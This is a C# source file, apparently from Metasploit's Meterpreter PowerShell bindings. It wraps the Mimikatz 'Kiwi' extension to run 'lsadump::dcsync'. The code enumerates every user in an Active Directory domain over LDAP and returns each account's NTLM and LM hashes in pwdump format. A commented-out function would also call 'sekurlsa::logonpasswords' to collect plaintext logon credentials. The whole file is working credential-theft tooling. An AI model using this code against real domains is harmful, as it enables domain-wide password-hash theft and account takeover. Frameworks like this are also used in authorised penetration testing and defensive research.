using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace MSF.Powershell.Meterpreter
{
    public static class Kiwi
    {
        public class Credential
        {
            public string Domain { get; set; }
            public string Username { get; set; }
            public string Password { get; set; }

            public override string ToString()
            {
                return string.Format("{0}|{1}|{2}", Password, Username, Domain);
            }
        }

        public class SyncRecord
        {
            public string Account { get; set; }
            public string NtlmHash { get; set; }
            public string LmHash { get; set; }
            public string SID { get; set; }
            public string RID { get; set; }

            public string HashString
            {
                get
                {
                    var lm = string.IsNullOrEmpty(LmHash) ? "aad3b435b51404eeaad3b435b51404ee" : LmHash;
                    var ntlm = string.IsNullOrEmpty(NtlmHash) ? "31d6cfe0d16ae931b73c59d7e0c089c0" : NtlmHash;
                    var userParts = Account.Split('\\');
                    return string.Format("{0}:{1}:{2}:{3}:::", userParts[userParts.Length - 1], RID, lm, ntlm);
                }
            }
        }

        public class HashReceivedEventArgs : EventArgs
        {
            public SyncRecord Record { get; private set; }

            public HashReceivedEventArgs(SyncRecord record)
            {
                Record = record;
            }
        }

        public delegate void HashReceivedEventHandler(object sender, HashReceivedEventArgs args);

        public class DcSyncAllSettings
        {
            public string Domain { get; set; }
            public string DomainController { get; set; }
            public string DomainFqdn { get; set; }
            public bool IncludeMachineAccounts { get; set; }
            public bool IncludeEmpty { get; set; }
        }

        private static readonly Regex ValueRegex = new Regex(@"\s*\*\s(?<k>[^:]*):\s(?<v>.*)");

        public static IEnumerable<string> DcSyncHashDump(DcSyncAllSettings settings)
        {
            foreach (var record in DcSyncAll(settings))
            {
                yield return record.HashString;
            }
        }

        public static IEnumerable<SyncRecord> DcSyncAll(DcSyncAllSettings settings)
        {
            if (User.IsSystem())
            {
                throw new InvalidOperationException("Current session is running as SYSTEM, dcsync won't work.");
            }

            System.Diagnostics.Debug.Write("[PSH BINDING - DCSYNCALL] User is not running as SYSTEM.");

            if (string.IsNullOrEmpty(settings.Domain))
            {
                settings.Domain = System.DirectoryServices.ActiveDirectory.Domain.GetComputerDomain().Name;
            }

            if (string.IsNullOrEmpty(settings.Domain))
            {
                throw new ArgumentException("Domain parameter must be specified.");
            }

            System.Diagnostics.Debug.WriteLine("[PSH BINDING - DCSYNCALL] Running against domain " + settings.Domain);

            using (var adRoot = new System.DirectoryServices.DirectoryEntry(string.Format("LDAP://{0}", settings.Domain)))
            using (var searcher = new System.DirectoryServices.DirectorySearcher(adRoot))
            {
                searcher.SearchScope = System.DirectoryServices.SearchScope.Subtree;
                searcher.ReferralChasing = System.DirectoryServices.ReferralChasingOption.All;
                searcher.Filter = "(objectClass=user)";
                searcher.PropertiesToLoad.Add("samAccountName");

                using (var searchResults = searcher.FindAll())
                {
                    System.Diagnostics.Debug.WriteLine("[PSH BINDING - DCSYNCALL] Search resulted in results: " + searchResults.Count.ToString());
                    foreach (System.DirectoryServices.SearchResult searchResult in searchResults)
                    {
                        if (searchResult != null)
                        {
                            var username = searchResult.Properties["samAccountName"][0].ToString();
                            System.Diagnostics.Debug.WriteLine("[PSH BINDING - DCSYNCALL] Found account: " + username);

                            if (settings.IncludeMachineAccounts || !username.EndsWith("$"))
                            {
                                var record = DcSync(string.Format("{0}\\{1}", settings.Domain, username), settings.DomainController, settings.DomainFqdn);

                                if (record != null && (settings.IncludeEmpty || !string.IsNullOrEmpty(record.NtlmHash)))
                                {
                                    yield return record;
                                }
                            }
                        }
                    }
                }
            }
        }

        public static SyncRecord DcSync(string username, string domainController = null, string domainFQDN = null)
        {
            if (User.IsSystem())
            {
                throw new InvalidOperationException("Current session is running as SYSTEM, dcsync won't work.");
            }

            System.Diagnostics.Debug.Write("[PSH BINDING - DCSYNC] User is not running as SYSTEM.");

            if (string.IsNullOrEmpty(username) || !username.Contains("\\"))
            {
                throw new ArgumentException("Username must be specified in the format 'DOMAIN\\username'.");
            }

            Tlv tlv = new Tlv();

            var command = string.Format("lsadump::dcsync /user:{0}", username);

            if (!string.IsNullOrEmpty(domainController))
            {
                command = string.Format("{0} /dc:{1}", command, domainController);
            }

            if (!string.IsNullOrEmpty(domainFQDN))
            {
                command = string.Format("{0} /domain:{1}", command, domainFQDN);
            }

            // Mustn't forget to wrap this in a string so it's considered a single command
            command = string.Format("\"{0}\"", command);
            System.Diagnostics.Debug.Write("[PSH BINDING - DCSYNC] Command execution will contain: " + command);

            tlv.Pack(TlvType.KiwiCmd, command);

            System.Diagnostics.Debug.Write("[PSH BINDING - DCSYNC] Invoking kiwi_exec_cmd");
            var result = Core.InvokeMeterpreterBinding(true, tlv.ToRequest(CommandId.KiwiExecCmd));
            System.Diagnostics.Debug.Write("[PSH BINDING - DCSYNC] Invoked kiwi_exec_cmd");
            if (result != null)
            {
                System.Diagnostics.Debug.Write("[PSH BINDING] Result returned, kiwi is probably loaded");
                var responseTlv = Tlv.FromResponse(result);

                System.Diagnostics.Debug.Write(string.Format("[PSH BINDING] DcSync response came back with {0} results", responseTlv.Count));
                System.Diagnostics.Debug.Write(string.Format("[PSH BINDING] DcSync response should contain a value for {0} {1}", TlvType.KiwiCmdResult, (int)TlvType.KiwiCmdResult));
                foreach(var k in responseTlv.Keys)
                {
                    System.Diagnostics.Debug.Write(string.Format("[PSH BINDING] DcSync response contains key: {0} ({1})", k, (int)k));
                }

                if (responseTlv[TlvType.Result].Count > 0 &&
                    (int)responseTlv[TlvType.Result][0] == 0 &&
                    responseTlv[TlvType.KiwiCmdResult].Count > 0 &&
                    responseTlv[TlvType.KiwiCmdResult][0].ToString().Length > 0)
                {
                    System.Diagnostics.Debug.Write("[PSH BINDING] DcSync returned with some data");

                    var resultString = responseTlv[TlvType.KiwiCmdResult][0].ToString();
                    var record = new SyncRecord
                    {
                        Account = username
                    };
                    var elementsFound = 0;

                    foreach (var line in resultString.Split('\n'))
                    {
                        var stripped = line.Trim();
                        if (stripped.StartsWith("Hash NTLM: "))
                        {
                            var parts = stripped.Split(' ');
                            record.NtlmHash = parts[parts.Length - 1];
                            elementsFound++;
                        }
                        else if (stripped.StartsWith("lm  - 0: "))
                        {
                            var parts = stripped.Split(' ');
                            record.LmHash = parts[parts.Length - 1];
                            elementsFound++;
                        }
                        else if (stripped.StartsWith("Object Security ID"))
                        {
                            var parts = stripped.Split(' ');
                            record.SID = parts[parts.Length - 1];
                            elementsFound++;
                        }
                        else if (stripped.StartsWith("Object Relative ID"))
                        {
                            var parts = stripped.Split(' ');
                            record.RID = parts[parts.Length - 1];
                            elementsFound++;
                        }

                        if (elementsFound > 3)
                        {
                            break;
                        }
                    }

                    return record;
                }
            }

            System.Diagnostics.Debug.Write("[PSH BINDING] No result returned, kiwi is probably not loaded");
            throw new InvalidOperationException("Kiwi extension not loaded.");
        }

        // OJ - 7th May 2018
        // This function was broken when we rejigged kiwi to work off the Mimikatz subrepo. Commenting this stuff
        // out for now until I fix it.
        //public static List<Credential> CredsAll()
        //{
        //    System.Diagnostics.Debug.Write("[PSH BINDING] Invoking binding call CredsAll");

        //    if (!User.IsSystem())
        //    {
        //        throw new InvalidOperationException("Current session is not running as SYSTEM");
        //    }

        //    Tlv tlv = new Tlv();
        //    tlv.Pack(TlvType.KiwiCmd, "sekurlsa::logonpasswords");

        //    var result = Core.InvokeMeterpreterBinding(true, tlv.ToRequest("kiwi_exec_command"));

        //    var ids = new Dictionary<string, Credential>();

        //    if (result != null)
        //    {
        //        System.Diagnostics.Debug.Write("[PSH BINDING] Result returned, kiwi is probably loaded");
        //        var responseTlv = Tlv.FromResponse(result);
        //        if (responseTlv[TlvType.Result].Count > 0 &&
        //            (int)responseTlv[TlvType.Result][0] == 0)
        //        {
        //            //foreach (var credObj in responseTlv[TlvType.KiwiPwdResult])
        //            //{
        //            //    var credDict = (Dictionary<TlvType, List<object>>)credObj;
        //            //    var credential = new Credential
        //            //    {
        //            //        Domain = Tlv.GetValue<string>(credDict, TlvType.KiwiPwdDomain, string.Empty),
        //            //        Username = Tlv.GetValue<string>(credDict, TlvType.KiwiPwdUserName, string.Empty),
        //            //        Password = Tlv.GetValue<string>(credDict, TlvType.KiwiPwdPassword, string.Empty)
        //            //    };

        //            //    if (!ids.ContainsKey(credential.ToString()))
        //            //    {
        //            //        ids.Add(credential.ToString(), credential);
        //            //    }
        //            //}

        //            return new List<Credential>(ids.Values);
        //        }
        //    }

        //    System.Diagnostics.Debug.Write("[PSH BINDING] Result not returned, kiwi is probably not loaded");
        //    throw new InvalidOperationException("Kiwi extension is not loaded");
        //}

        //private static List<Dictionary<string, string>> ParseSSP(string[] output)
        //{
        //    var results = new Dictionary<string, Dictionary<string, string>>();
        //    var lines = new Queue<string>(output);

        //    while (lines.Count > 0)
        //    {
        //        var l = lines.Dequeue();
        //        // Make sure it's an SSP cred
        //        if (!Regex.IsMatch(l, @"\sssp\s:"))
        //        {
        //            continue;
        //        }

        //        l = lines.Dequeue();
        //        while (Regex.IsMatch(l, @"\[\d\]"))
        //        {
        //            var d = new Dictionary<string, string>();
        //            l = lines.Dequeue();
        //            for (int i = 0; i < 3; ++i)
        //            {
        //                ParseAndAddValue(l, d);
        //                l = lines.Dequeue();
        //            }

        //            //results[d.V
        //        }
        //    }

        //    // return new List<Credential>(results.Values);
        //    return null;
        //}

        //private static void ParseAndAddValue(string line, Dictionary<string, string> values)
        //{
        //    var match = ValueRegex.Match(line);
        //    if (match.Success)
        //    {
        //        values[match.Groups["k"].Value] = match.Groups["v"].Value;
        //    }
        //}
    }
}
